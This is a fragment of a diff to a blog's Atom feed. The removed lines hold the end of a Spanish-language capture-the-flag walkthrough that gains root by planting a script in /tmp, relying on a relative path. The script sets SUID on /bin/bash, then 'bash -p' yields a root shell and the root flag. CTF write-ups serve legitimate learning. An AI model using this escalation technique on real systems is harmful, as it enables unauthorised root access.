-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Something went wrong'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Donde el script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;full-checkup.sh&lt;/code&gt; no se le indica la ruta, es decir, se ejecuta desde el directorio donde este el usuario, asi que… ¿Por que no crearlo?, me ire al directorio /tmp y dentro del script, le asignare permisos SUID a /bin/bash:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#!/bin/bash
-chmod +s /bin/bash
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora solo ponemos: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bash -p&lt;/code&gt; y ya somos root&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-5.1# whoami
-root
-bash-5.1# cat /root/root.txt 
-f46884c23c53cc716ac549803*******
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;</content><author><name>c4rta</name></author><category term="posts" /><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/assets/img/busqueda/waifu.gif" /><media:content medium="image" url="/assets/img/busqueda/waifu.gif" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
+&lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;</content><author><name>c4rta</name></author><category term="posts" /><category term="type confusion" /><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/assets/img/HTB-entity/waifu.gif" /><media:content medium="image" url="/assets/img/HTB-entity/waifu.gif" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
